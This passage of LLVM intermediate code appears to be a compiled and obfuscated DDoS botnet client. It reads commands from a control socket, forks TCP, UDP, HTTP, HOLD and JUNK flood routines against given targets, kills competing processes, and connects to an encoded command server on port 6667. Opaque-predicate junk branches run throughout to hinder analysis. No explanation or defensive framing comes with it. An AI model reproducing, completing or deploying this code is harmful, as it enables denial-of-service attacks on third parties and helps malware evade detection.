  br i1 %1015, label %1016, label %1021

; <label>:1016:                                   ; preds = %995
  %1017 = load i8**, i8*** %4, align 8
  %1018 = getelementptr inbounds i8*, i8** %1017, i64 7
  %1019 = load i8*, i8** %1018, align 8
  %1020 = call i32 @atoi(i8* %1019) #10
  br label %1022

; <label>:1021:                                   ; preds = %995
  br label %1022

; <label>:1022:                                   ; preds = %1021, %1016
  %1023 = phi i32 [ %1020, %1016 ], [ 10, %1021 ]
  %1024 = load i32, i32* @x.79
  %1025 = load i32, i32* @y.80
  %1026 = sub i32 %1024, 1
  %1027 = mul i32 %1024, %1026
  %1028 = urem i32 %1027, 2
  %1029 = icmp eq i32 %1028, 0
  %1030 = icmp slt i32 %1025, 10
  %1031 = or i1 %1029, %1030
  br i1 %1031, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1022
  store i32 %1023, i32* %29, align 4
  %1032 = load i32, i32* %3, align 4
  %1033 = icmp sgt i32 %1032, 6
  %1034 = load i32, i32* @x.79
  %1035 = load i32, i32* @y.80
  %1036 = sub i32 %1034, 1
  %1037 = mul i32 %1034, %1036
  %1038 = urem i32 %1037, 2
  %1039 = icmp eq i32 %1038, 0
  %1040 = icmp slt i32 %1035, 10
  %1041 = or i1 %1039, %1040
  br i1 %1041, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %1033, label %1042, label %1047

; <label>:1042:                                   ; preds = %originalBBpart2124
  %1043 = load i8**, i8*** %4, align 8
  %1044 = getelementptr inbounds i8*, i8** %1043, i64 6
  %1045 = load i8*, i8** %1044, align 8
  %1046 = call i32 @atoi(i8* %1045) #10
  br label %1048

; <label>:1047:                                   ; preds = %originalBBpart2124
  br label %1048

; <label>:1048:                                   ; preds = %1047, %1042
  %1049 = phi i32 [ %1046, %1042 ], [ 0, %1047 ]
  store i32 %1049, i32* %30, align 4
  %1050 = load i8*, i8** %24, align 8
  %1051 = call i8* @strstr(i8* %1050, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %1052 = icmp ne i8* %1051, null
  br i1 %1052, label %1053, label %1127

; <label>:1053:                                   ; preds = %1048
  %1054 = load i32, i32* @x.79
  %1055 = load i32, i32* @y.80
  %1056 = sub i32 %1054, 1
  %1057 = mul i32 %1054, %1056
  %1058 = urem i32 %1057, 2
  %1059 = icmp eq i32 %1058, 0
  %1060 = icmp slt i32 %1055, 10
  %1061 = or i1 %1059, %1060
  br i1 %1061, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1053
  %1062 = load i32, i32* @mainCommSock, align 4
  %1063 = load i8*, i8** %24, align 8
  %1064 = load i32, i32* %26, align 4
  %1065 = call i32 (i32, i8*, ...) @sockprintf(i32 %1062, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.67, i32 0, i32 0), i8* %1063, i32 %1064)
  %1066 = load i8*, i8** %24, align 8
  %1067 = call i8* @strtok(i8* %1066, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %1067, i8** %31, align 8
  %1068 = load i32, i32* @x.79
  %1069 = load i32, i32* @y.80
  %1070 = sub i32 %1068, 1
  %1071 = mul i32 %1068, %1070
  %1072 = urem i32 %1071, 2
  %1073 = icmp eq i32 %1072, 0
  %1074 = icmp slt i32 %1069, 10
  %1075 = or i1 %1073, %1074
  br i1 %1075, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %1076

; <label>:1076:                                   ; preds = %1108, %originalBBpart2128
  %1077 = load i32, i32* @x.79
  %1078 = load i32, i32* @y.80
  %1079 = sub i32 %1077, 1
  %1080 = mul i32 %1077, %1079
  %1081 = urem i32 %1080, 2
  %1082 = icmp eq i32 %1081, 0
  %1083 = icmp slt i32 %1078, 10
  %1084 = or i1 %1082, %1083
  br i1 %1084, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1076
  %1085 = load i8*, i8** %31, align 8
  %1086 = icmp ne i8* %1085, null
  %1087 = load i32, i32* @x.79
  %1088 = load i32, i32* @y.80
  %1089 = sub i32 %1087, 1
  %1090 = mul i32 %1087, %1089
  %1091 = urem i32 %1090, 2
  %1092 = icmp eq i32 %1091, 0
  %1093 = icmp slt i32 %1088, 10
  %1094 = or i1 %1092, %1093
  br i1 %1094, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %1086, label %1095, label %1110

; <label>:1095:                                   ; preds = %originalBBpart2132
  %1096 = call i32 @listFork()
  %1097 = icmp ne i32 %1096, 0
  br i1 %1097, label %1108, label %1098

; <label>:1098:                                   ; preds = %1095
  %1099 = load i8*, i8** %31, align 8
  %1100 = load i32, i32* %25, align 4
  %1101 = load i32, i32* %26, align 4
  %1102 = load i32, i32* %27, align 4
  %1103 = load i8*, i8** %28, align 8
  %1104 = load i32, i32* %30, align 4
  %1105 = load i32, i32* %29, align 4
  call void @sendTCP(i8* %1099, i32 %1100, i32 %1101, i32 %1102, i8* %1103, i32 %1104, i32 %1105)
  %1106 = load i32, i32* @mainCommSock, align 4
  %1107 = call i32 @close(i32 %1106)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1108:                                   ; preds = %1095
  %1109 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %1109, i8** %31, align 8
  br label %1076

; <label>:1110:                                   ; preds = %originalBBpart2132
  %1111 = load i32, i32* @x.79
  %1112 = load i32, i32* @y.80
  %1113 = sub i32 %1111, 1
  %1114 = mul i32 %1111, %1113
  %1115 = urem i32 %1114, 2
  %1116 = icmp eq i32 %1115, 0
  %1117 = icmp slt i32 %1112, 10
  %1118 = or i1 %1116, %1117
  br i1 %1118, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1110
  %1119 = load i32, i32* @x.79
  %1120 = load i32, i32* @y.80
  %1121 = sub i32 %1119, 1
  %1122 = mul i32 %1119, %1121
  %1123 = urem i32 %1122, 2
  %1124 = icmp eq i32 %1123, 0
  %1125 = icmp slt i32 %1120, 10
  %1126 = or i1 %1124, %1125
  br i1 %1126, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %1161

; <label>:1127:                                   ; preds = %1048
  %1128 = load i32, i32* @x.79
  %1129 = load i32, i32* @y.80
  %1130 = sub i32 %1128, 1
  %1131 = mul i32 %1128, %1130
  %1132 = urem i32 %1131, 2
  %1133 = icmp eq i32 %1132, 0
  %1134 = icmp slt i32 %1129, 10
  %1135 = or i1 %1133, %1134
  br i1 %1135, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1127
  %1136 = call i32 @listFork()
  %1137 = icmp ne i32 %1136, 0
  %1138 = load i32, i32* @x.79
  %1139 = load i32, i32* @y.80
  %1140 = sub i32 %1138, 1
  %1141 = mul i32 %1138, %1140
  %1142 = urem i32 %1141, 2
  %1143 = icmp eq i32 %1142, 0
  %1144 = icmp slt i32 %1139, 10
  %1145 = or i1 %1143, %1144
  br i1 %1145, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br i1 %1137, label %1146, label %1147

; <label>:1146:                                   ; preds = %originalBBpart2140
  br label %1248

; <label>:1147:                                   ; preds = %originalBBpart2140
  %1148 = load i32, i32* @mainCommSock, align 4
  %1149 = load i8*, i8** %24, align 8
  %1150 = load i32, i32* %26, align 4
  %1151 = call i32 (i32, i8*, ...) @sockprintf(i32 %1148, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.67, i32 0, i32 0), i8* %1149, i32 %1150)
  %1152 = load i8*, i8** %24, align 8
  %1153 = load i32, i32* %25, align 4
  %1154 = load i32, i32* %26, align 4
  %1155 = load i32, i32* %27, align 4
  %1156 = load i8*, i8** %28, align 8
  %1157 = load i32, i32* %30, align 4
  %1158 = load i32, i32* %29, align 4
  call void @sendTCP(i8* %1152, i32 %1153, i32 %1154, i32 %1155, i8* %1156, i32 %1157, i32 %1158)
  %1159 = load i32, i32* @mainCommSock, align 4
  %1160 = call i32 @close(i32 %1159)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1161:                                   ; preds = %originalBBpart2136
  br label %1162

; <label>:1162:                                   ; preds = %1161, %originalBBpart2108
  %1163 = load i8**, i8*** %4, align 8
  %1164 = getelementptr inbounds i8*, i8** %1163, i64 0
  %1165 = load i8*, i8** %1164, align 8
  %1166 = call i32 @strcmp(i8* %1165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0)) #10
  %1167 = icmp ne i32 %1166, 0
  br i1 %1167, label %1225, label %1168

; <label>:1168:                                   ; preds = %1162
  store i32 0, i32* %32, align 4
  store i64 0, i64* %33, align 8
  br label %1169

; <label>:1169:                                   ; preds = %1211, %1168
  %1170 = load i64, i64* %33, align 8
  %1171 = load i64, i64* @numpids, align 8
  %1172 = icmp ult i64 %1170, %1171
  br i1 %1172, label %1173, label %1214

; <label>:1173:                                   ; preds = %1169
  %1174 = load i32*, i32** @pids, align 8
  %1175 = load i64, i64* %33, align 8
  %1176 = getelementptr inbounds i32, i32* %1174, i64 %1175
  %1177 = load i32, i32* %1176, align 4
  %1178 = icmp ne i32 %1177, 0
  br i1 %1178, label %1179, label %1210

; <label>:1179:                                   ; preds = %1173
  %1180 = load i32*, i32** @pids, align 8
  %1181 = load i64, i64* %33, align 8
  %1182 = getelementptr inbounds i32, i32* %1180, i64 %1181
  %1183 = load i32, i32* %1182, align 4
  %1184 = call i32 @getpid() #4
  %1185 = icmp ne i32 %1183, %1184
  br i1 %1185, label %1186, label %1210

; <label>:1186:                                   ; preds = %1179
  %1187 = load i32, i32* @x.79
  %1188 = load i32, i32* @y.80
  %1189 = sub i32 %1187, 1
  %1190 = mul i32 %1187, %1189
  %1191 = urem i32 %1190, 2
  %1192 = icmp eq i32 %1191, 0
  %1193 = icmp slt i32 %1188, 10
  %1194 = or i1 %1192, %1193
  br i1 %1194, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1186
  %1195 = load i32*, i32** @pids, align 8
  %1196 = load i64, i64* %33, align 8
  %1197 = getelementptr inbounds i32, i32* %1195, i64 %1196
  %1198 = load i32, i32* %1197, align 4
  %1199 = call i32 @kill(i32 %1198, i32 9) #4
  %1200 = load i32, i32* %32, align 4
  %1201 = add nsw i32 %1200, 1
  store i32 %1201, i32* %32, align 4
  %1202 = load i32, i32* @x.79
  %1203 = load i32, i32* @y.80
  %1204 = sub i32 %1202, 1
  %1205 = mul i32 %1202, %1204
  %1206 = urem i32 %1205, 2
  %1207 = icmp eq i32 %1206, 0
  %1208 = icmp slt i32 %1203, 10
  %1209 = or i1 %1207, %1208
  br i1 %1209, label %originalBBpart2153, label %originalBB142alteredBB

originalBBpart2153:                               ; preds = %originalBB142
  br label %1210

; <label>:1210:                                   ; preds = %originalBBpart2153, %1179, %1173
  br label %1211

; <label>:1211:                                   ; preds = %1210
  %1212 = load i64, i64* %33, align 8
  %1213 = add i64 %1212, 1
  store i64 %1213, i64* %33, align 8
  br label %1169

; <label>:1214:                                   ; preds = %1169
  %1215 = load i32, i32* %32, align 4
  %1216 = icmp sgt i32 %1215, 0
  br i1 %1216, label %1217, label %1221

; <label>:1217:                                   ; preds = %1214
  %1218 = load i32, i32* @mainCommSock, align 4
  %1219 = load i32, i32* %32, align 4
  %1220 = call i32 (i32, i8*, ...) @sockprintf(i32 %1218, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.69, i32 0, i32 0), i32 %1219)
  br label %1224

; <label>:1221:                                   ; preds = %1214
  %1222 = load i32, i32* @mainCommSock, align 4
  %1223 = call i32 (i32, i8*, ...) @sockprintf(i32 %1222, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.70, i32 0, i32 0))
  br label %1224

; <label>:1224:                                   ; preds = %1221, %1217
  br label %1225

; <label>:1225:                                   ; preds = %1224, %1162
  %1226 = load i8**, i8*** %4, align 8
  %1227 = getelementptr inbounds i8*, i8** %1226, i64 0
  %1228 = load i8*, i8** %1227, align 8
  %1229 = call i32 @strcmp(i8* %1228, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0)) #10
  %1230 = icmp ne i32 %1229, 0
  br i1 %1230, label %1248, label %1231

; <label>:1231:                                   ; preds = %1225
  %1232 = load i32, i32* @x.79
  %1233 = load i32, i32* @y.80
  %1234 = sub i32 %1232, 1
  %1235 = mul i32 %1232, %1234
  %1236 = urem i32 %1235, 2
  %1237 = icmp eq i32 %1236, 0
  %1238 = icmp slt i32 %1233, 10
  %1239 = or i1 %1237, %1238
  br i1 %1239, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %1231
  call void @exit(i32 0) #14
  %1240 = load i32, i32* @x.79
  %1241 = load i32, i32* @y.80
  %1242 = sub i32 %1240, 1
  %1243 = mul i32 %1240, %1242
  %1244 = urem i32 %1243, 2
  %1245 = icmp eq i32 %1244, 0
  %1246 = icmp slt i32 %1241, 10
  %1247 = or i1 %1245, %1246
  br i1 %1247, label %originalBBpart2157, label %originalBB155alteredBB

originalBBpart2157:                               ; preds = %originalBB155
  unreachable

; <label>:1248:                                   ; preds = %1225, %1146, %994, %852, %784, %737, %611, %originalBBpart264, %374, %340, %250, %177, %originalBBpart216, %151, %originalBBpart212, %originalBBpart24, %48, %39
  %1249 = load i32, i32* @x.79
  %1250 = load i32, i32* @y.80
  %1251 = sub i32 %1249, 1
  %1252 = mul i32 %1249, %1251
  %1253 = urem i32 %1252, 2
  %1254 = icmp eq i32 %1253, 0
  %1255 = icmp slt i32 %1250, 10
  %1256 = or i1 %1254, %1255
  br i1 %1256, label %originalBB159, label %originalBB159alteredBB

originalBB159:                                    ; preds = %originalBB159alteredBB, %1248
  %1257 = load i32, i32* @x.79
  %1258 = load i32, i32* @y.80
  %1259 = sub i32 %1257, 1
  %1260 = mul i32 %1257, %1259
  %1261 = urem i32 %1260, 2
  %1262 = icmp eq i32 %1261, 0
  %1263 = icmp slt i32 %1258, 10
  %1264 = or i1 %1262, %1263
  br i1 %1264, label %originalBBpart2161, label %originalBB159alteredBB

originalBBpart2161:                               ; preds = %originalBB159
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %59
  %1265 = load i32, i32* %3, align 4
  %1266 = icmp ne i32 %1265, 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %78
  %1267 = load i32, i32* @mainCommSock, align 4
  %1268 = call i32 (i32, i8*, ...) @sockprintf(i32 %1267, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.54, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %103
  %1269 = load i32, i32* @scanPid, align 4
  %1270 = icmp eq i32 %1269, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %122
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %156
  %1271 = load i32, i32* %5, align 4
  store i32 %1271, i32* @scanPid, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %178
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %197
  %1272 = load i8**, i8*** %4, align 8
  %1273 = getelementptr inbounds i8*, i8** %1272, i64 0
  %1274 = load i8*, i8** %1273, align 8
  %1275 = call i32 @strcmp(i8* %1274, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0)) #10
  %1276 = icmp ne i32 %1275, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %228
  %1277 = load i8**, i8*** %4, align 8
  %1278 = getelementptr inbounds i8*, i8** %1277, i64 3
  %1279 = load i8*, i8** %1278, align 8
  %1280 = call i32 @atoi(i8* %1279) #10
  %1281 = icmp slt i32 %1280, 1
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %266
  %1282 = load i32, i32* @mainCommSock, align 4
  %1283 = load i8*, i8** %6, align 8
  %1284 = load i32, i32* %7, align 4
  %1285 = load i32, i32* %8, align 4
  %1286 = call i32 (i32, i8*, ...) @sockprintf(i32 %1282, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.58, i32 0, i32 0), i8* %1283, i32 %1284, i32 %1285)
  %1287 = load i8*, i8** %6, align 8
  %1288 = call i8* @strtok(i8* %1287, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %1288, i8** %9, align 8
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %290
  %1289 = load i8*, i8** %9, align 8
  %1290 = icmp ne i8* %1289, null
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %312
  %1291 = load i8*, i8** %9, align 8
  %1292 = load i32, i32* %7, align 4
  %1293 = load i32, i32* %8, align 4
  call void @sendHOLD(i8* %1291, i32 %1292, i32 %1293)
  %1294 = load i32, i32* @mainCommSock, align 4
  %1295 = call i32 @close(i32 %1294)
  call void @_exit(i32 0) #12
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %375
  %1296 = load i8**, i8*** %4, align 8
  %1297 = getelementptr inbounds i8*, i8** %1296, i64 1
  %1298 = load i8*, i8** %1297, align 8
  store i8* %1298, i8** %10, align 8
  %1299 = load i8**, i8*** %4, align 8
  %1300 = getelementptr inbounds i8*, i8** %1299, i64 2
  %1301 = load i8*, i8** %1300, align 8
  %1302 = call i32 @atoi(i8* %1301) #10
  store i32 %1302, i32* %11, align 4
  %1303 = load i8**, i8*** %4, align 8
  %1304 = getelementptr inbounds i8*, i8** %1303, i64 3
  %1305 = load i8*, i8** %1304, align 8
  %1306 = call i32 @atoi(i8* %1305) #10
  store i32 %1306, i32* %12, align 4
  %1307 = load i8*, i8** %10, align 8
  %1308 = call i8* @strstr(i8* %1307, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %1309 = icmp ne i8* %1308, null
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %414
  %1310 = load i8*, i8** %13, align 8
  %1311 = icmp ne i8* %1310, null
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %436
  %1312 = load i8*, i8** %13, align 8
  %1313 = load i32, i32* %11, align 4
  %1314 = load i32, i32* %12, align 4
  call void @sendJUNK(i8* %1312, i32 %1313, i32 %1314)
  %1315 = load i32, i32* @mainCommSock, align 4
  %1316 = call i32 @close(i32 %1315)
  call void @_exit(i32 0) #12
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %458
  %1317 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %1317, i8** %13, align 8
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %477
  %1318 = call i32 @listFork()
  %1319 = icmp ne i32 %1318, 0
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %496
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %534
  %1320 = load i8**, i8*** %4, align 8
  %1321 = getelementptr inbounds i8*, i8** %1320, i64 3
  %1322 = load i8*, i8** %1321, align 8
  %1323 = call i32 @atoi(i8* %1322) #10
  %1324 = icmp eq i32 %1323, -1
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %562
  %1325 = load i8**, i8*** %4, align 8
  %1326 = getelementptr inbounds i8*, i8** %1325, i64 4
  %1327 = load i8*, i8** %1326, align 8
  %1328 = call i32 @atoi(i8* %1327) #10
  %1329 = icmp eq i32 %1328, -1
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %634
  %1330 = load i8**, i8*** %4, align 8
  %1331 = getelementptr inbounds i8*, i8** %1330, i64 6
  %1332 = load i8*, i8** %1331, align 8
  %1333 = call i32 @atoi(i8* %1332) #10
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %671
  %1334 = call i32 @listFork()
  %1335 = icmp ne i32 %1334, 0
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %690
  %1336 = load i8*, i8** %20, align 8
  %1337 = load i32, i32* %15, align 4
  %1338 = load i32, i32* %16, align 4
  %1339 = load i32, i32* %17, align 4
  %1340 = load i32, i32* %18, align 4
  %1341 = load i32, i32* %19, align 4
  call void @sendUDP(i8* %1336, i32 %1337, i32 %1338, i32 %1339, i32 %1340, i32 %1341)
  %1342 = load i32, i32* @mainCommSock, align 4
  %1343 = call i32 @close(i32 %1342)
  call void @_exit(i32 0) #12
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %718
  %1344 = call i32 @listFork()
  %1345 = icmp ne i32 %1344, 0
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %753
  %1346 = load i8**, i8*** %4, align 8
  %1347 = getelementptr inbounds i8*, i8** %1346, i64 0
  %1348 = load i8*, i8** %1347, align 8
  %1349 = call i32 @strcmp(i8* %1348, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.64, i32 0, i32 0)) #10
  %1350 = icmp ne i32 %1349, 0
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %796
  %1351 = load i32, i32* @mainCommSock, align 4
  %1352 = load i8*, i8** %21, align 8
  %1353 = load i32, i32* %22, align 4
  %1354 = call i32 (i32, i8*, ...) @sockprintf(i32 %1351, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.65, i32 0, i32 0), i8* %1352, i32 %1353)
  %1355 = load i8*, i8** %21, align 8
  %1356 = call i8* @strtok(i8* %1355, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %1356, i8** %23, align 8
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %833
  %1357 = call i32 @listFork()
  %1358 = icmp ne i32 %1357, 0
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %853
  %1359 = load i32, i32* @mainCommSock, align 4
  %1360 = load i8*, i8** %21, align 8
  %1361 = load i32, i32* %22, align 4
  %1362 = call i32 (i32, i8*, ...) @sockprintf(i32 %1359, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.65, i32 0, i32 0), i8* %1360, i32 %1361)
  %1363 = load i8*, i8** %21, align 8
  %1364 = load i32, i32* %22, align 4
  call void @sendHTTP(i8* %1363, i32 %1364)
  %1365 = load i32, i32* @mainCommSock, align 4
  %1366 = call i32 @close(i32 %1365)
  call void @_exit(i32 0) #12
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %879
  %1367 = load i8**, i8*** %4, align 8
  %1368 = getelementptr inbounds i8*, i8** %1367, i64 0
  %1369 = load i8*, i8** %1368, align 8
  %1370 = call i32 @strcmp(i8* %1369, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0)) #10
  %1371 = icmp ne i32 %1370, 0
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %901
  %1372 = load i32, i32* %3, align 4
  %1373 = icmp slt i32 %1372, 6
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %926
  %1374 = load i8**, i8*** %4, align 8
  %1375 = getelementptr inbounds i8*, i8** %1374, i64 2
  %1376 = load i8*, i8** %1375, align 8
  %1377 = call i32 @atoi(i8* %1376) #10
  %1378 = icmp eq i32 %1377, -1
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %969
  %1379 = load i32, i32* %3, align 4
  %1380 = icmp eq i32 %1379, 8
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1022
  store i32 %1023, i32* %29, align 4
  %1381 = load i32, i32* %3, align 4
  %1382 = icmp sgt i32 %1381, 6
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1053
  %1383 = load i32, i32* @mainCommSock, align 4
  %1384 = load i8*, i8** %24, align 8
  %1385 = load i32, i32* %26, align 4
  %1386 = call i32 (i32, i8*, ...) @sockprintf(i32 %1383, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.67, i32 0, i32 0), i8* %1384, i32 %1385)
  %1387 = load i8*, i8** %24, align 8
  %1388 = call i8* @strtok(i8* %1387, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %1388, i8** %31, align 8
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1076
  %1389 = load i8*, i8** %31, align 8
  %1390 = icmp ne i8* %1389, null
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1110
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1127
  %1391 = call i32 @listFork()
  %1392 = icmp ne i32 %1391, 0
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1186
  %1393 = load i32*, i32** @pids, align 8
  %1394 = load i64, i64* %33, align 8
  %1395 = getelementptr inbounds i32, i32* %1393, i64 %1394
  %1396 = load i32, i32* %1395, align 4
  %1397 = call i32 @kill(i32 %1396, i32 9) #4
  %1398 = load i32, i32* %32, align 4
  %_ = shl i32 %1398, 1
  %_143 = shl i32 %1398, 1
  %_144 = sub i32 0, %1398
  %gen = add i32 %_144, 1
  %_145 = sub i32 0, %1398
  %gen146 = add i32 %_145, 1
  %_147 = sub i32 %1398, 1
  %gen148 = mul i32 %_147, 1
  %_149 = shl i32 %1398, 1
  %_150 = sub i32 %1398, 1
  %gen151 = mul i32 %_150, 1
  %1399 = add nsw i32 %1398, 1
  store i32 %1399, i32* %32, align 4
  br label %originalBB142

originalBB155alteredBB:                           ; preds = %originalBB155, %1231
  call void @exit(i32 0) #14
  br label %originalBB155

originalBB159alteredBB:                           ; preds = %originalBB159, %1248
  br label %originalBB159
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %26

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @x.81
  %9 = load i32, i32* @y.82
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* @mainCommSock, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* @mainCommSock, align 4
  %18 = load i32, i32* @x.81
  %19 = load i32, i32* @y.82
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %0
  %27 = load i32, i32* @currentServer, align 4
  %28 = add nsw i32 %27, 1
  %29 = sext i32 %28 to i64
  %30 = icmp eq i64 %29, 1
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %26
  store i32 0, i32* @currentServer, align 4
  br label %35

; <label>:32:                                     ; preds = %26
  %33 = load i32, i32* @currentServer, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* @currentServer, align 4
  br label %35

; <label>:35:                                     ; preds = %32, %31
  %36 = load i32, i32* @x.81
  %37 = load i32, i32* @y.82
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %35
  %44 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %45 = load i32, i32* @currentServer, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %46
  %48 = load i8*, i8** %47, align 8
  %49 = call i8* @decode(i8* %48)
  %50 = call i8* @strcpy(i8* %44, i8* %49) #4
  store i32 6667, i32* %3, align 4
  %51 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %52 = call i8* @strchr(i8* %51, i32 58) #10
  %53 = icmp ne i8* %52, null
  %54 = load i32, i32* @x.81
  %55 = load i32, i32* @y.82
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %53, label %62, label %85

; <label>:62:                                     ; preds = %originalBBpart24
